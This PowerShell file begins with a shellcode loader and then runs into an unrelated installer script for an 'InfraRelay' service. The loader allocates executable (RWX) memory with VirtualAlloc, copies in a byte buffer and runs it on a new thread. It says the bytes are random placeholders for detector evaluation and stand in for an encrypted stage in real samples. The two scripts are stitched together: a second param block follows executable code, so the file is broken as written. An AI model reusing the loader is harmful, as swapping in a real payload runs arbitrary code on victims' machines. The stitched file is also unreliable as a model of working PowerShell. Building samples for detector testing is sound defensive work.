
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class Win32Api
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x58, 0x26, 0x77, 0x2f, 0x32, 0x83, 0x90, 0xc2, 0x75, 0x7b, 0xcf, 0x14, 0x83, 0x46, 0xea, 0x82,
        0xb3, 0xec, 0xec, 0x85, 0xd2, 0x52, 0xc3, 0x26, 0x91, 0x2c, 0x04, 0xee, 0xc9, 0x91, 0xd6, 0x98,
        0x15, 0x3e, 0x9e, 0x91, 0x03, 0x33, 0x47, 0x0e, 0x3d, 0x9e, 0x53, 0xa1, 0x51, 0xf3, 0x93, 0x69,
        0xa4, 0xfd, 0x42, 0x28, 0x00, 0x7e, 0x2a, 0x7e, 0x08, 0x8b, 0xf4, 0x76, 0x9d, 0x41, 0xbe, 0x27,
        0x26, 0xae, 0x47, 0x6f, 0xb6, 0xac, 0xd6, 0x9c, 0x76, 0xd1, 0x89, 0x7a, 0x66, 0xac, 0x9e, 0xcc,
        0x71, 0xa2, 0x2b, 0xdb, 0x7d, 0xb2, 0x68, 0x93, 0x33, 0x9c, 0x71, 0xbb, 0x38, 0x9a, 0x90, 0x98,
        0xcd, 0x8e, 0x7d, 0xba, 0x14, 0x6b, 0xb9, 0xb6, 0x52, 0x78, 0xb7, 0xba, 0xcc, 0x2e, 0x87, 0xbe,
        0x73, 0xec, 0xc3, 0xc1, 0x2c, 0x56, 0xcb, 0x00, 0xd3, 0xf6, 0x85, 0x8c, 0xdc, 0xcd, 0x47, 0x5d,
        0x87, 0x28, 0x96, 0xde, 0xd0, 0x80, 0x4a, 0x06, 0x20, 0x84, 0x1f, 0xf7, 0x79, 0x02, 0xbf, 0xa2,
        0xcd, 0x79, 0x0e, 0xcb, 0xda, 0xe2, 0x9e, 0xc9, 0x13, 0x10, 0x72, 0x42, 0x6b, 0xa9, 0x94, 0x5b,
        0x99, 0x94, 0xa7, 0x0b, 0xa4, 0x49, 0x6d, 0x71, 0x5b, 0x39, 0xcf, 0xf9, 0x4d, 0x30, 0x99, 0x0d,
        0xcd, 0xce, 0xc6, 0x52, 0x47, 0x16, 0x30, 0xd0, 0x94, 0x51, 0xb0, 0x85, 0xeb, 0x8b, 0x62, 0x76,
        0xdb, 0xca, 0x39, 0xa2, 0x30, 0x0f, 0x21, 0x59, 0x31, 0xae, 0x24, 0x2b, 0xce, 0x36, 0xee, 0xb0,
        0xde, 0x5c, 0xf5, 0xd7, 0xdf, 0x05, 0x7a, 0xc5, 0x97, 0xa5, 0x15, 0x43, 0x6a, 0x2e, 0x29, 0x1c,
        0xd3, 0x4e, 0x70, 0x3f, 0x90, 0xf9, 0x3e, 0x48, 0xc3, 0x40, 0xa7, 0x51, 0xdd, 0x40, 0xa5, 0x3e,
        0x4f, 0x3d, 0x86, 0x9a, 0xad, 0x8c, 0x66, 0x80, 0x25, 0xf4, 0xa8, 0x8a, 0x4a, 0x6e, 0xe6, 0xd1,
        0xb9, 0x9a, 0x8b, 0x39, 0x89, 0x54, 0x58, 0xe0, 0xdb, 0x74, 0x5e, 0x4e, 0x0c, 0x47, 0x67, 0xc5,
        0x00, 0x2b, 0xd2, 0x50, 0xf2, 0x13, 0x0c, 0x90, 0x7b, 0x14, 0xd6, 0x7c, 0xed, 0x22, 0xc4, 0x12,
        0x68, 0x49, 0xd2, 0x93, 0x8d, 0x43, 0xc8, 0x39, 0xa2, 0x5a, 0xaa, 0xe3, 0xc1, 0x0b, 0x66, 0x29,
        0x02, 0x55, 0x76, 0xb1, 0x42, 0x46, 0x72, 0xaa, 0xda, 0x79, 0x1c, 0x6b, 0x0f, 0xeb, 0x27, 0x24,
        0x34, 0xc8, 0x16, 0xa9, 0xc5, 0xf3, 0x92, 0x6f, 0xe4, 0xd2, 0x8a, 0x57, 0x81, 0x51, 0xa1, 0x3e,
        0xbe, 0xf5, 0xc2, 0xc9, 0xa8, 0x20, 0xc6, 0x4a, 0x7f, 0xb0, 0xb5, 0xd6, 0x0e, 0xf0, 0x60, 0xb7,
        0xbe, 0x0d, 0x9b, 0x3c, 0x8c, 0xff, 0xf2, 0xc6, 0xff, 0xf5, 0x28, 0x3c, 0x04, 0x14, 0x35, 0xc5,
        0x9a, 0x14, 0x4f, 0x3a, 0x20, 0x71, 0x26, 0xc8, 0xee, 0x9e, 0x56, 0xa1, 0x01, 0x00, 0x55, 0x7d,
        0x07, 0xf1, 0xf9, 0x06, 0x0b, 0xdf, 0xe9, 0x8c, 0x9a, 0xd9, 0x11, 0x38, 0xd6, 0x15, 0x8c, 0x79,
        0x0c, 0xdd, 0xc5, 0x77, 0x0e, 0xc8, 0x22, 0x0c, 0xa8, 0x64, 0xeb, 0x3e, 0x65, 0xde, 0x2b, 0x29,
        0x63, 0x25, 0xcb, 0x60, 0x12, 0x70, 0xc8, 0xf9, 0x18, 0xe9, 0x90, 0xad, 0x8b, 0x37, 0xfe, 0x0c,
        0xa6, 0x01, 0x76, 0x08, 0x2b, 0xad, 0x97, 0xf2, 0xe3, 0x00, 0x81, 0x25, 0x44, 0x17, 0xa4, 0xb8,
        0xb8, 0x51, 0xda, 0xfc, 0xb9, 0xb9, 0x4d, 0x37, 0x2e, 0x68, 0x67, 0xcf
    )

    $BufferAddress = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][Win32Api]::WaitForSingleObject($Thread, 4010)
    [void][Win32Api]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$InstallerPath = 'C:\Scripts\packages\InfraRelay-4.2.3.msi',
    [string]$ServiceName = "InfraRelay",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$Port = 8080,
    [int]$TimeoutSec = 60,
    [string]$LogPath = 'C:\Logs\install-infrarelay-2025-06-22.log',

    [string]$RuleName = "InfraRelay Inbound"
)

$ErrorActionPreference = 'Stop'

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}

if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)

$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$regPath = 'HKLM:\SOFTWARE\Adatum\InfraRelay'
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '4.2.3' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null

$rule = Get-NetFirewallRule -DisplayName "InfraRelay Inbound" -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName "InfraRelay Inbound" -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
$details = [pscustomobject]@{
    Product   = 'InfraRelay'
    Version   = '4.2.3'
    Service   = $installed.Name
    Status    = $installed.Status
    Port      = $Port
    Installer = $InstallerPath
    LogPath   = $LogPath
    InstalledAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$details | ConvertTo-Json -Depth 3 | Set-Content -Path ($LogPath.Replace('.log', '.json')) -Encoding UTF8

$style = @'
<style>
body { font-family: Tahoma; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($details) | ConvertTo-Html -Title 'Installation summary' -Head $style |
    Set-Content -Path ($LogPath.Replace('.log', '.html')) -Encoding UTF8

$MailTo = 'deploy@adatum.com'
$subject = "InfraRelay 4.2.3 deployed on $env:COMPUTERNAME"

$mailParams = @{
    To         = $MailTo
    From       = 'deploy@adatum.com'
    Subject    = $subject
    Body       = "Installation completed and the service is responding."
    SmtpServer = "smtp.adatum.com"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams
$stale = Get-ChildItem -Path $env:TEMP -Filter 'infrarelay-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
foreach ($dir in $stale) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host ("Deployment finished for {0}" -f $ServiceName) -ForegroundColor Green

$agentConfig = Join-Path $env:ProgramData 'InfraRelay\agent.json'
if (Test-Path -LiteralPath (Split-Path -Parent $agentConfig)) {
    Write-Verbose ("Config folder present: {0}" -f (Split-Path -Parent $agentConfig))
}

$logTail = Get-Content -LiteralPath $LogPath -Tail 5 -ErrorAction SilentlyContinue
if ($logTail) {
    Write-Verbose ("Last log lines: {0}" -f ($logTail -join ' | '))
}

$disk = Get-PSDrive -Name C
Write-Verbose ("Free space on C: {0} GB" -f [math]::Round($disk.Free / 1GB, 1))

$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
$entry = Get-ChildItem -Path $uninstallKey -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath } |
    Where-Object { $_.DisplayName -like 'InfraRelay*' } | Select-Object -First 1
if ($entry) {
    Write-Verbose ("Registered version: {0}" -f $entry.DisplayVersion)
}

$rebootPending = Test-Path -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending'
if ($rebootPending) {
    Write-Warning 'A reboot is pending before the next deployment.'
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)
